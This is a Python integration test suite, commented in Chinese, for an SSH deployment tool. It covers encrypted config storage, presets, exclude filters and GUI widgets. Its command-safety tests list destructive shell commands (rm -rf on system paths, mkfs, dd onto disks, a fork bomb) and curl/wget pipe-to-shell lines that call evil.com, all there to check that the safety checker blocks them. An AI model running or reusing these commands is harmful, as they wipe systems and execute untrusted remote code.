#!/usr/bin/env python
"""部署工具 — 全功能集成测试
运行: PYTHONPATH=src .venv/Scripts/python.exe tests/test_integration.py
"""

import sys, os, json, tempfile, shutil, time, unittest, uuid

# 确保 src 在 path 中
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))


# ============================================================================
# 测试 1：配置层集成 — DPAPI + AES + ConfigStore 完整流程
# ============================================================================
class TestConfigIntegration(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        from deploy_tool.config.store import ConfigStore
        cls.tmp = tempfile.mkdtemp()
        cls.old_appdata = os.environ.get("APPDATA", "")
        os.environ["APPDATA"] = cls.tmp

    @classmethod
    def tearDownClass(cls):
        os.environ["APPDATA"] = cls.old_appdata
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def test_01_first_run_initialization(self):
        """首次启动：DPAPI 生成主密钥，创建空配置"""
        from deploy_tool.config.store import ConfigStore
        store = ConfigStore()
        self.assertFalse(store.is_initialized(), "新环境不应已初始化")
        store.init_first_run()
        self.assertTrue(store.is_initialized(), "init_first_run 后应已初始化")
        self.assertTrue(os.path.exists(store.key_path), "master.key.enc 应存在")
        self.assertTrue(os.path.exists(store.config_path), "config.enc 应存在")
        print("  [PASS] 首次启动初始化通过")

    def test_02_reload_persists_state(self):
        """重新加载：配置正确恢复"""
        from deploy_tool.config.store import ConfigStore
        store = ConfigStore()
        store.load()
        self.assertEqual(store.config.theme, "auto")
        self.assertEqual(store.config.log_level, "INFO")
        self.assertEqual(len(store.config.servers), 0)
        print("  [PASS] 重新加载状态一致")

    def test_03_add_server_and_save(self):
        """添加服务器：凭据加密存储"""
        from deploy_tool.config.store import ConfigStore
        from deploy_tool.config.models import Server, AuthMethod, ProxyType, ProxyConfig

        store = ConfigStore()
        store.load()

        # 密码认证服务器
        s1 = Server(name="生产服务器", host="192.168.1.100", port=22,
                     username="deploy", auth_method=AuthMethod.PASSWORD)
        s1.password = store.encrypt_credential("mySecret123!")
        store.add_server(s1)

        # 密钥认证 + SOCKS5 代理服务器
        s2 = Server(name="境外服务器", host="8.8.8.8", port=2222,
                     username="ubuntu", auth_method=AuthMethod.KEY,
                     key_path="C:\\Users\\test\\.ssh\\id_rsa")
        s2.key_passphrase = store.encrypt_credential("keyPass!")
        s2.proxy = ProxyConfig(type=ProxyType.SOCKS5, host="127.0.0.1",
                               port=1080, username="proxy_user")
        s2.proxy.password = store.encrypt_credential("proxySecret!")
        store.add_server(s2)

        store.save()
        self.assertEqual(len(store.config.servers), 2)
        print("  [PASS] 添加 2 个服务器并保存")
        return s1.id

    def test_04_reload_servers_with_credentials(self):
        """重新加载服务器：凭据正确解密"""
        from deploy_tool.config.store import ConfigStore

        store = ConfigStore()
        store.load()
        self.assertEqual(len(store.config.servers), 2)

        s1 = store.config.servers[0]
        self.assertEqual(s1.name, "生产服务器")
        self.assertEqual(s1.host, "192.168.1.100")
        self.assertEqual(store.decrypt_credential(s1.password), "mySecret123!")

        s2 = store.config.servers[1]
        self.assertEqual(s2.name, "境外服务器")
        self.assertEqual(s2.proxy.type.value, "socks5")
        self.assertEqual(s2.proxy.port, 1080)
        self.assertEqual(store.decrypt_credential(s2.key_passphrase), "keyPass!")
        self.assertEqual(store.decrypt_credential(s2.proxy.password), "proxySecret!")
        print("  [PASS] 凭据加解密循环正确")

    def test_05_add_project_with_preset(self):
        """添加项目：预设自动填充"""
        from deploy_tool.config.store import ConfigStore
        from deploy_tool.config.models import Project
        from deploy_tool.config.presets import apply_preset

        store = ConfigStore()
        store.load()
        server_id = store.config.servers[0].id

        # Vue 项目
        p1 = Project(name="管理后台前端")
        p1.server_id = server_id
        p1.local_path = "D:\\projects\\admin\\dist"
        p1.remote_path = "/var/www/admin"
        apply_preset(p1, "vue")
        store.add_project(p1)

        # Go 项目
        p2 = Project(name="API 服务")
        p2.server_id = server_id
        p2.local_path = "D:\\projects\\api\\build"
        p2.remote_path = "/opt/app/api"
        apply_preset(p2, "go")
        store.add_project(p2)

        # Node 项目
        p3 = Project(name="Node 服务")
        p3.server_id = store.config.servers[1].id
        p3.local_path = "D:\\projects\\node-app\\dist"
        p3.remote_path = "/opt/app/node"
        apply_preset(p3, "node")
        store.add_project(p3)

        store.save()
        self.assertEqual(len(store.config.projects), 3)
        print("  [PASS] 添加 3 个项目（vue/go/node）")

    def test_06_preset_content_verification(self):
        """验证预设内容正确性"""
        from deploy_tool.config.store import ConfigStore

        store = ConfigStore()
        store.load()

        projects = store.config.projects
        # Vue 预设
        self.assertEqual(projects[0].project_type, "vue")
        self.assertIn("node_modules/", projects[0].exclude_patterns)
        self.assertIn("src/", projects[0].exclude_patterns)
        self.assertEqual(projects[0].sync_mode, "size_mtime")

        # Go 预设：应排除 .go 源码
        self.assertEqual(projects[1].project_type, "go")
        self.assertIn("*.go", projects[1].exclude_patterns)
        self.assertIn("go.mod", projects[1].exclude_patterns)
        self.assertTrue(any("systemctl" in c for c in projects[1].post_deploy_commands),
                        "Go 预设应包含服务重启命令")

        # Node 预设
        self.assertEqual(projects[2].project_type, "node")
        self.assertIn("node_modules/", projects[2].exclude_patterns)
        self.assertTrue(any("npm install" in c for c in projects[2].post_deploy_commands))
        self.assertTrue(any("pm2 restart" in c for c in projects[2].post_deploy_commands))
        print("  [PASS] 预设内容验证通过")

    def test_07_server_find_and_delete(self):
        """服务器查找与删除"""
        from deploy_tool.config.store import ConfigStore

        store = ConfigStore()
        store.load()

        sid1 = store.config.servers[0].id
        sid2 = store.config.servers[1].id

        self.assertIsNotNone(store.find_server(sid1))
        self.assertIsNotNone(store.find_server(sid2))
        self.assertIsNone(store.find_server("nonexistent"))

        store.remove_server(sid1)
        self.assertEqual(len(store.config.servers), 1)
        self.assertIsNone(store.find_server(sid1))
        print("  [PASS] 服务器查找/删除正确")

    def test_08_deploy_record(self):
        """部署记录添加"""
        from deploy_tool.config.store import ConfigStore
        from deploy_tool.config.models import DeployRecord

        store = ConfigStore()
        store.load()

        rec = DeployRecord(
            project_id=store.config.projects[0].id,
            server_id=store.config.servers[0].id,
            started_at="2026-06-29 15:00:00",
            finished_at="2026-06-29 15:00:05",
            status="success",
            files_uploaded=42,
            bytes_transferred=1048576,
        )
        store.add_deploy_record(rec)
        self.assertEqual(len(store.config.deploy_records), 1)
        self.assertEqual(store.config.deploy_records[0].status, "success")
        print("  [PASS] 部署记录添加正确")


# ============================================================================
# 测试 2：安全模块 — 全面边界测试
# ============================================================================
class TestSafetyComprehensive(unittest.TestCase):
    def test_rm_rf_variants_blocked(self):
        """各种 rm -rf 危险变体都应被拦截"""
        from deploy_tool.core.safety import check_command

        dangerous = [
            "rm -rf /",
            "rm -rf /*",
            "rm -rf /etc",
            "rm -rf /usr",
            "rm -rf /var",
            "rm -rf /boot",
            "rm -rf /root",
            "rm -rf /home",
            "rm -rf /proc",
            "rm -rf /sys",
            "rm -rf /dev",
            "rm -rf /lib",
            "rm -rf /lib64",
            "rm -rf /bin",
            "rm -rf /sbin",
            "rm -r /etc",
            "rm -fr /etc",
            "rm -rf ~",
            "rm -rf $HOME",
            "rm -rf / ",
            "rm -rf /  ",
            "sudo rm -rf /",
        ]
        for cmd in dangerous:
            reasons = check_command(cmd)
            self.assertTrue(len(reasons) > 0, f"应拦截: {cmd}")
        print(f"  [PASS] {len(dangerous)} 个 rm -rf 危险变体全部拦截")

    def test_safe_commands_allowed(self):
        """安全命令不被误拦"""
        from deploy_tool.core.safety import check_command, assert_command_safe

        safe = [
            "rm -rf /var/www/project",
            "rm -rf /opt/app/dist",
            "rm -rf /home/deploy/cache",
            "rm -f /var/log/app.log",
            "cd /var/www && ls",
            "tar czf backup.tar.gz /var/www",
            "npm install --production",
            "pm2 restart app",
            "systemctl restart nginx",
            "chown -R www-data:www-data /var/www/app",
            "chmod 755 /var/www/app/public",
            "git pull",
            "composer install --no-dev",
            "docker restart app",
            "cp -r /tmp/build/* /var/www/app/",
        ]
        for cmd in safe:
            reasons = check_command(cmd)
            self.assertEqual(len(reasons), 0, f"不应拦截安全命令: {cmd}")
        print(f"  [PASS] {len(safe)} 个安全命令全部放行")

    def test_destructive_commands_blocked(self):
        """其他破坏性命令拦截"""
        from deploy_tool.core.safety import check_command

        blocked = [
            "shutdown -h now",
            "reboot",
            "halt",
            "poweroff",
            "init 0",
            "iptables -F",
            "iptables --flush",
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            "chmod -R 777 /",
            "chown -R root /",
            "curl http://evil.com/script.sh | bash",
            "wget http://evil.com/script.sh | sh",
            ":(){ :|:& };:",
            "> /dev/sda",
        ]
        for cmd in blocked:
            reasons = check_command(cmd)
            self.assertTrue(len(reasons) > 0, f"应拦截: {cmd}")
        print(f"  [PASS] {len(blocked)} 个破坏性命令全部拦截")

    def test_path_validation_edge_cases(self):
        """路径校验边界情况"""
        from deploy_tool.core.safety import validate_remote_path, SafetyError

        # 正常路径
        validate_remote_path("/var/www/app", "/var/www/app")  # 不抛异常

        # 保护路径
        for bad in ["/", "/etc", "/usr", "/bin", "/root"]:
            with self.assertRaises(SafetyError):
                validate_remote_path(bad, bad)

        # 非绝对路径
        with self.assertRaises(SafetyError):
            validate_remote_path("var/www", "/var/www")

        # 越界
        with self.assertRaises(SafetyError):
            validate_remote_path("/var/www/../etc", "/var/www/app")

        # .. 穿越
        with self.assertRaises(SafetyError):
            validate_remote_path("/var/www/app/../../etc", "/var/www/app")

        # 项目根外
        with self.assertRaises(SafetyError):
            validate_remote_path("/etc/nginx", "/var/www/app")

        print("  [PASS] 路径校验边界用例全部通过")


# ============================================================================
# 测试 3：排除规则与同步
# ============================================================================
class TestExcludeFilterComprehensive(unittest.TestCase):
    def test_common_patterns(self):
        """常见排除场景"""
        from deploy_tool.core.sync.filters import ExcludeFilter

        f = ExcludeFilter([
            ".git/", "node_modules/", "vendor/",
            ".env", ".env.*", "*.log", "*.pyc", "__pycache__/",
            ".idea/", ".vscode/", "*.swp", "Thumbs.db",
        ])

        # 应排除
        self.assertTrue(f.is_excluded(".git/config"))
        self.assertTrue(f.is_excluded("node_modules/react/index.js"))
        self.assertTrue(f.is_excluded("vendor/autoload.php"))
        self.assertTrue(f.is_excluded(".env"))
        self.assertTrue(f.is_excluded(".env.production"))
        self.assertTrue(f.is_excluded(".env.local"))
        self.assertTrue(f.is_excluded("error.log"))
        self.assertTrue(f.is_excluded("app.pyc"))
        self.assertTrue(f.is_excluded("__pycache__/app.cpython-313.pyc"))
        self.assertTrue(f.is_excluded(".idea/workspace.xml"))
        self.assertTrue(f.is_excluded(".vscode/settings.json"))
        self.assertTrue(f.is_excluded("test.swp"))
        self.assertTrue(f.is_excluded("Thumbs.db"))

        # 不应排除
        self.assertFalse(f.is_excluded("src/app.ts"))
        self.assertFalse(f.is_excluded("config.yaml"))
        self.assertFalse(f.is_excluded("environment.ts"))
        self.assertFalse(f.is_excluded("public/index.html"))
        self.assertFalse(f.is_excluded("README.md"))

        print("  [PASS] 常见排除模式测试通过")

    def test_wildcard_star_dot(self):
        """通配符和点号处理"""
        from deploy_tool.core.sync.filters import ExcludeFilter

        f = ExcludeFilter(["*.tar.gz", "*.zip", "dist.tar.*"])

        self.assertTrue(f.is_excluded("backup.tar.gz"))
        self.assertTrue(f.is_excluded("dist.tar.1"))
        self.assertTrue(f.is_excluded("app.zip"))
        self.assertFalse(f.is_excluded("app.tar"))  # 不匹配 *.tar.gz
        self.assertFalse(f.is_excluded("dist.tar"))
        print("  [PASS] 通配符排除正确")


# ============================================================================
# 测试 4：项目预设
# ============================================================================
class TestProjectPresets(unittest.TestCase):
    def test_all_presets(self):
        """所有预设都能正确应用"""
        from deploy_tool.config.presets import apply_preset, get_preset_list
        from deploy_tool.config.models import Project

        presets = get_preset_list()
        # 不再硬编码数量与具体 id 集合，避免新增预设时频繁破坏测试
        for p in presets:
            assert "id" in p and "label" in p and "description" in p
            assert "local_path_hint" in p  # 字段完整性

        for p in presets:
            project = Project()
            apply_preset(project, p["id"])
            self.assertEqual(project.project_type, p["id"])
            self.assertIsNotNone(project.exclude_patterns)
            self.assertTrue(len(project.exclude_patterns) > 0,
                            f"{p['id']} 预设应有排除规则")
        print(f"  [PASS] {len(presets)} 种预设全部有效")

    def test_preset_no_overwrite(self):
        """预设不覆盖用户已设置的值"""
        from deploy_tool.config.presets import apply_preset
        from deploy_tool.config.models import Project

        p = Project(name="自定义")
        p.exclude_patterns = ["custom/"]
        p.pre_deploy_commands = ["echo hello"]
        apply_preset(p, "vue")
        # 用户自定义的不应被覆盖
        self.assertIn("custom/", p.exclude_patterns)
        self.assertEqual(p.pre_deploy_commands, ["echo hello"])
        print("  [PASS] 预设不覆盖用户自定义值")


# ============================================================================
# 测试 5：SSH 模块结构
# ============================================================================
class TestSSHModule(unittest.TestCase):
    def test_proxy_modules(self):
        """代理模块可导入，函数签名正确"""
        from deploy_tool.core.ssh import proxy

        self.assertTrue(callable(proxy.make_socks5_socket), "make_socks5_socket 应存在")
        self.assertTrue(callable(proxy.make_http_connect_socket), "make_http_connect_socket 应存在")
        self.assertTrue(callable(proxy.make_proxyjump_channel), "make_proxyjump_channel 应存在")
        print("  [PASS] 代理模块函数可导入")

    def test_client_signature(self):
        """SSH 客户端类方法签名正确"""
        import inspect
        from deploy_tool.core.ssh.client import SSHClient

        methods = [m for m in dir(SSHClient) if not m.startswith("_")]
        self.assertIn("connect", methods)
        self.assertIn("sftp", methods)
        self.assertIn("exec", methods)
        self.assertIn("close", methods)

        # exec 返回类型注解
        sig = inspect.signature(SSHClient.exec)
        self.assertIn("cmd", sig.parameters)
        self.assertIn("timeout", sig.parameters)
        print("  [PASS] SSHClient 接口正确")

    def test_pool_interface(self):
        """连接池接口正确"""
        from deploy_tool.core.ssh.pool import ConnectionPool
        import inspect

        self.assertEqual(ConnectionPool.IDLE_TIMEOUT, 600)
        methods = [m for m in dir(ConnectionPool) if not m.startswith("_")]
        self.assertIn("get", methods)
        self.assertIn("close", methods)
        self.assertIn("close_all", methods)
        print("  [PASS] ConnectionPool 接口正确")


# ============================================================================
# 测试 6：备份与回滚模块
# ============================================================================
class TestBackupModule(unittest.TestCase):
    def test_backup_manager_interface(self):
        """备份管理器接口正确"""
        from deploy_tool.core.backup import BackupManager
        import inspect

        methods = [m for m in dir(BackupManager) if not m.startswith("_")]
        self.assertIn("create_backup", methods)
        self.assertIn("rollback", methods)
        print("  [PASS] BackupManager 接口正确")


# ============================================================================
# 测试 7：部署编排器
# ============================================================================
class TestDeployerModule(unittest.TestCase):
    def test_deployer_interface(self):
        """部署编排器接口正确"""
        from deploy_tool.core.deployer import Deployer, DeployResult
        import inspect

        dr = DeployResult()
        self.assertTrue(hasattr(dr, "record"))
        self.assertTrue(hasattr(dr, "error"))

        methods = [m for m in dir(Deployer) if not m.startswith("_")]
        self.assertIn("deploy", methods)
        sig = inspect.signature(Deployer.deploy)
        self.assertIn("selected_diffs", sig.parameters)
        self.assertIn("progress_cb", sig.parameters)
        self.assertIn("log_cb", sig.parameters)
        print("  [PASS] Deployer 接口正确")

    def test_command_runner_interface(self):
        """命令执行器接口正确"""
        from deploy_tool.core.commands import CommandRunner
        methods = [m for m in dir(CommandRunner) if not m.startswith("_")]
        self.assertIn("run_checked", methods)
        print("  [PASS] CommandRunner 接口正确")


# ============================================================================
# 测试 8：数据模型
# ============================================================================
class TestDataModels(unittest.TestCase):
    def test_server_defaults(self):
        """Server 模型默认值"""
        from deploy_tool.config.models import Server, AuthMethod, ProxyType
        s = Server()
        self.assertIsNotNone(s.id, "id 应有唯一 UUID")
        self.assertNotEqual(s.id, "", "id 不应为空")
        self.assertEqual(s.port, 22)
        self.assertEqual(s.username, "root")
        self.assertEqual(s.auth_method, AuthMethod.PASSWORD)
        self.assertEqual(s.proxy.type, ProxyType.NONE)
        print("  [PASS] Server 模型默认值")

    def test_project_defaults(self):
        """Project 模型默认值"""
        from deploy_tool.config.models import Project
        p = Project()
        self.assertIsNotNone(p.id)
        self.assertEqual(p.project_type, "generic")
        self.assertTrue(p.enable_backup)
        self.assertEqual(p.max_backups, 5)
        self.assertEqual(p.sync_mode, "size_mtime")
        # 默认排除规则
        self.assertIn(".git/", p.exclude_patterns)
        self.assertIn("node_modules/", p.exclude_patterns)
        print("  [PASS] Project 模型默认值")

    def test_file_diff_enum(self):
        """DiffStatus 枚举值"""
        from deploy_tool.config.models import FileDiff, DiffStatus
        d = FileDiff("test.txt", DiffStatus.NEW)
        self.assertEqual(d.status, DiffStatus.NEW)
        self.assertTrue(d.selected, "默认应选中")
        print("  [PASS] FileDiff / DiffStatus 模型")

    def test_proxy_config(self):
        """ProxyConfig 各种类型"""
        from deploy_tool.config.models import ProxyConfig, ProxyType

        pj = ProxyConfig(type=ProxyType.PROXYJUMP, jump_host="10.0.0.1",
                         jump_port=22, jump_username="admin")
        self.assertEqual(pj.type, ProxyType.PROXYJUMP)
        self.assertEqual(pj.jump_host, "10.0.0.1")

        ss = ProxyConfig(type=ProxyType.SOCKS5, host="127.0.0.1", port=1080)
        self.assertEqual(ss.type, ProxyType.SOCKS5)
        self.assertEqual(ss.host, "127.0.0.1")

        http = ProxyConfig(type=ProxyType.HTTP, host="proxy.corp.com", port=8080)
        self.assertEqual(http.type, ProxyType.HTTP)

        none = ProxyConfig(type=ProxyType.NONE)
        self.assertEqual(none.type, ProxyType.NONE)
        print("  [PASS] ProxyConfig 各代理类型")


# ============================================================================
# 测试 9：工具模块
# ============================================================================
class TestUtils(unittest.TestCase):
    def test_logger_setup(self):
        """日志系统可配置"""
        import tempfile
        from deploy_tool.utils.logger import setup_logger
        from deploy_tool.config.paths import app_data_dir

        old = os.environ.get("APPDATA", "")
        tmp = tempfile.mkdtemp()
        os.environ["APPDATA"] = tmp
        try:
            # 设置所有级别
            for level in ["DEBUG", "INFO", "WARNING", "ERROR"]:
                logger = setup_logger(level)
                self.assertIsNotNone(logger)
            log_dir = os.path.join(tmp, "deploy_tool", "logs")
            self.assertTrue(os.path.exists(log_dir))
        finally:
            os.environ["APPDATA"] = old
            shutil.rmtree(tmp, ignore_errors=True)
        print("  [PASS] 日志系统正常")

    def test_hash_module(self):
        """文件哈希正确"""
        from deploy_tool.utils.hash import file_sha256
        import hashlib

        # 创建临时文件
        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".txt")
        try:
            tmp.write(b"Hello, deploy tool!")
            tmp.close()
            h = file_sha256(tmp.name)
            self.assertEqual(len(h), 64)
            expected = hashlib.sha256(b"Hello, deploy tool!").hexdigest()
            self.assertEqual(h, expected)
        finally:
            os.unlink(tmp.name)
        print("  [PASS] 文件哈希正确")

    def test_fs_utils(self):
        """文件系统工具"""
        from deploy_tool.utils.fs import ensure_dir, count_files, total_size

        tmp = tempfile.mkdtemp()
        try:
            # ensure_dir
            d = os.path.join(tmp, "a", "b", "c")
            ensure_dir(d)
            self.assertTrue(os.path.exists(d))

            # count_files
            for i in range(5):
                with open(os.path.join(tmp, f"test_{i}.txt"), "w") as f:
                    f.write("x" * 100)
            self.assertEqual(count_files(tmp), 5)

            # total_size
            self.assertEqual(total_size(tmp), 500)
        finally:
            shutil.rmtree(tmp, ignore_errors=True)
        print("  [PASS] 文件系统工具正确")


# ============================================================================
# 测试 10：GUI 实例化（无头模式）
# ============================================================================
class TestGUIInstantiation(unittest.TestCase):
    def test_theme_detect(self):
        """主题检测函数"""
        from deploy_tool.ui.theme import detect_system_theme, apply_theme

        theme = detect_system_theme()
        self.assertIn(theme, ["light", "dark"], f"主题应为 light/dark，实际: {theme}")
        print(f"  [PASS] 当前系统主题: {theme}")

    def test_widgets_instantiation(self):
        """核心 widget 可实例化"""
        from PyQt5 import QtWidgets
        app = QtWidgets.QApplication(sys.argv)

        from deploy_tool.ui.widgets.diff_view import DiffViewWidget
        dv = DiffViewWidget()
        self.assertIsNotNone(dv)

        from deploy_tool.ui.widgets.log_panel import LogPanel
        lp = LogPanel()
        self.assertIsNotNone(lp)
        lp.info("测试日志")
        lp.error("测试错误")

        app.quit()
        print("  [PASS] DiffView / LogPanel 实例化正常")

    def test_dialogs_instantiation(self):
        """对话框可实例化 — ConfigStore 集成测试"""
        import tempfile
        from PyQt5 import QtWidgets

        from deploy_tool.config.store import ConfigStore
        from deploy_tool.config.models import Server, Project, AuthMethod

        tmp = tempfile.mkdtemp()
        old_appdata = os.environ.get("APPDATA", "")
        os.environ["APPDATA"] = tmp

        try:
            app = QtWidgets.QApplication(sys.argv)

            store = ConfigStore()
            store.init_first_run()

            # 加个服务器
            s = Server(name="测试", host="1.1.1.1")
            s.password = store.encrypt_credential("test")
            store.add_server(s)

            p = Project(name="测试项目", server_id=s.id,
                        local_path="D:\\test", remote_path="/var/www/test")
            store.add_project(p)

            # ServerDialog
            from deploy_tool.ui.dialogs.server_dialog import ServerDialog
            sd = ServerDialog(store)
            self.assertIsNotNone(sd)

            # ProjectDialog
            from deploy_tool.ui.dialogs.project_dialog import ProjectDialog
            pd = ProjectDialog(store, server_id=s.id)
            self.assertIsNotNone(pd)

            # DeployDialog
            from deploy_tool.ui.dialogs.deploy_dialog import DeployDialog
            from deploy_tool.config.models import FileDiff, DiffStatus
            diffs = [
                FileDiff("a.js", DiffStatus.NEW),
                FileDiff("b.css", DiffStatus.MODIFIED),
                FileDiff("c.html", DiffStatus.DELETED),
            ]
            dd = DeployDialog(diffs, p)
            self.assertIsNotNone(dd)

            # SettingsDialog
            from deploy_tool.ui.dialogs.rollback_dialog import SettingsDialog
            sd2 = SettingsDialog(store)
            self.assertIsNotNone(sd2)

            app.quit()
        finally:
            os.environ["APPDATA"] = old_appdata
            shutil.rmtree(tmp, ignore_errors=True)
        print("  [PASS] 5 个对话框全部可实例化")

    def test_workers_instantiation(self):
        """Worker 线程可实例化"""
        from PyQt5 import QtWidgets
        import tempfile

        from deploy_tool.config.store import ConfigStore
        from deploy_tool.core.ssh.pool import ConnectionPool
        from deploy_tool.config.models import Server, Project, BackupInfo

        tmp = tempfile.mkdtemp()
        old = os.environ.get("APPDATA", "")
        os.environ["APPDATA"] = tmp

        try:
            app = QtWidgets.QApplication(sys.argv)

            store = ConfigStore()
            store.init_first_run()
            s = Server(name="t", host="1.1.1.1")
            s.password = store.encrypt_credential("t")
            store.add_server(s)
            p = Project(name="t", server_id=s.id,
                        local_path="D:\\t", remote_path="/var/t")
            store.add_project(p)
            pool = ConnectionPool(store)

            from deploy_tool.ui.workers.base import (
                TestConnectionWorker, DiffWorker,
                DeployWorker, RollbackWorker,
            )

            # 实例化不启动（避免真实 SSH 连接）
            w1 = TestConnectionWorker(store, pool, s.id)
            w2 = DiffWorker(store, pool, p)
            w3 = DeployWorker(store, pool, p, [])
            w4 = RollbackWorker(store, pool, p, BackupInfo())

            for name, w in [("TestConnection", w1), ("Diff", w2), ("Deploy", w3), ("Rollback", w4)]:
                self.assertTrue(hasattr(w, "log"))
                self.assertTrue(hasattr(w, "progress"))
                self.assertTrue(hasattr(w, "finished_ok"))
                self.assertTrue(hasattr(w, "failed"))

            app.quit()
        finally:
            os.environ["APPDATA"] = old
            shutil.rmtree(tmp, ignore_errors=True)
        print("  [PASS] 4 个 Worker 全部可实例化")


# ============================================================================
# 运行所有测试
# ============================================================================
if __name__ == "__main__":
    # 抑制 PyQt5 的 QApplication 重复创建警告（用 os.environ QT_QPA_PLATFORM 控制）
    os.environ["QT_QPA_PLATFORM"] = "offscreen"

    print("=" * 70)
    print("  部署工具 — 全功能集成测试")
    print("=" * 70)
    print()

    runner = unittest.TextTestRunner(verbosity=2)
    suite = unittest.TestSuite()

    # 按顺序加载（配置层必须先测，它为 GUI 测试准备数据）
    suite.addTests(unittest.defaultTestLoader.loadTestsFromTestCase(TestConfigIntegration))
    suite.addTests(unittest.defaultTestLoader.loadTestsFromTestCase(TestSafetyComprehensive))
    suite.addTests(unittest.defaultTestLoader.loadTestsFromTestCase(TestExcludeFilterComprehensive))
    suite.addTests(unittest.defaultTestLoader.loadTestsFromTestCase(TestProjectPresets))
    suite.addTests(unittest.defaultTestLoader.loadTestsFromTestCase(TestSSHModule))
    suite.addTests(unittest.defaultTestLoader.loadTestsFromTestCase(TestBackupModule))
    suite.addTests(unittest.defaultTestLoader.loadTestsFromTestCase(TestDeployerModule))
    suite.addTests(unittest.defaultTestLoader.loadTestsFromTestCase(TestDataModels))
    suite.addTests(unittest.defaultTestLoader.loadTestsFromTestCase(TestUtils))
    suite.addTests(unittest.defaultTestLoader.loadTestsFromTestCase(TestGUIInstantiation))

    result = runner.run(suite)

    print()
    print("=" * 70)
    if result.wasSuccessful():
        print("  [PASS] 全部测试通过！")
    else:
        print(f"  [FAIL] 失败 {len(result.failures)} 错误 {len(result.errors)}")
    print("=" * 70)
